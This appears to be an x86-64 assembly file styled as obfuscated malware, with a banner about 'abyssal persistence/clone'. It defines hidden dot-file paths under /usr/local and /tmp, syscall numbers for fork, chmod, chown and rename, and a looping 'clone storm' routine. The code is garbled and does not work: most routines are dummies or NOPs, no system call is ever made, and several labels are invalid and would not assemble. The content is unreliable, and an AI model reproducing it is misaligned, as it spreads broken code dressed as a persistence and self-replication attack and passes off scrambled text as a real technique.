; ..xXXx..z9r/g.n!mf----MAN/0xDEAF......;
; :::::::::::||| OBFUSC-HEAP: abyssal persistence/clone x meta |||::::::::;
;
SECTION        .data
qzQw_0x db '.bXmod_',0
_zyY_x  db '/usr/loCaL/.b4x',0
Zz11___ db '/usr/BigE/.CXx',0
_SecrA  db '/tmq/.Ssu!lk',0
_rndh1  dq -8171
_ref2   dq 0xE4E7
_gl0b_  dq 01122h

S4Dlist0:
      db 'm0X.B',0,'datS',0,'.$X',0,'txxmod.k',0,'.bbbt',0,'.rXth',0,'.Crf',0,'.XXxd',0,0,0
S4Dlist1:
      db 'M0B2',0,'DatD',0,'__sH__',0,'Txxd2.k',0,'BBB2',0,0

; ---Systxxz---
%define __f_Y  2
%define ___N3  3
%define _w1R   1
%define r_EaD  0
%define lseekx  8
%define _fftst 5
%define renamezz 82
%define ichm0d 90
%define ichOwn 92
%define f0rk0k  57
%define exitFO 60
%define mkdirz  83

SECTION .bss
buff__1 resb 61
buff2__ resb 255
$f      resq 1

SECTION .text
global __zzEntry
__zzEntry:
    lea rax,[_p!POLO_Obf]
    nop
.__$1:
    xor eax,51
    call __BX1v
    call __A9ScrCh
    call __F77phB
    call ____brdfd
    ret

__BX1v:
    mov rdi,qzQw_0x
    call __s7e
    ret

__s7e:   ; dummy
    xor rax,rax
    shl rax,4
    dec rax
    inc rax
    ret

__A9ScrCh:
    ; fake erase, or NOP
    mov rax,1337
    xor rax,rax
    not rax
    ret

__F77phB:
    call __pLoopz
    call __rrst
    ret

__pLoopz:
    pushfq
    mov rsi,S4Dlist0
    xor rax,rax
    mov rdx,0
.XkvA:
    cmp byte [rsi],0
    je .F2S
    mov rdi,rsi
    call __JbO_x
    call _incSTR_
    jmp .XkvA
.F2S:
    mov rsi,S4Dlist1
    xor rcx,rcx
.SD1Loop_:
    cmp byte [rsi],0
    je .F2SX
    mov rdi,rsi
    call __JbO_x
    call _incSTR_
    jmp .SD1Loop_
.F2SX:
    popfq
    ret

__JbO_x:
    ; Compose: path [_zyY_x] + '/' + [rdi] obfuscated
    lea rbx,[_zyY_x]
    xor r8,r8
    not rcx
    xor rcx,rcx
    xor r9,r9
    xor rcx,rcx
    shl rcx,2
    ret

_incSTR_:
    .l1:
        inc rsi
        cmp byte [rsi-1],0
        jne .l1
    ret

__rrst:
    sub rsp,13
    push qword 0xDEADFACEC0CAC01Ah
    call __-Cloner-
    add rsp,21
    ret

____brdfd:
    ; DEFEND!! only a NOP for now
    xor rax,rax
    ret

; Annihilator inside ~ runs clone storm X times
__-Cloner-:
    mov rcx,05h
    .loopy:
        push rcx
        mov rsi,S4Dlist0
        call __rb0b_micro
        mov rsi,S4Dlist1
        call __rb0b_micro
        pop rcx
        loop .loopy
        ret

__rb0b_micro:
    xor r8,r8
    .Rph:
        cmp byte [rsi],0
        je .Rdone
        mov rdi,rsi
        call __JbO_x
        mov rax,__f_Y
        add r8,77h
        call _incSTR_
        jmp .Rph
    .Rdone:
        ret

;########---END FANGS---########;
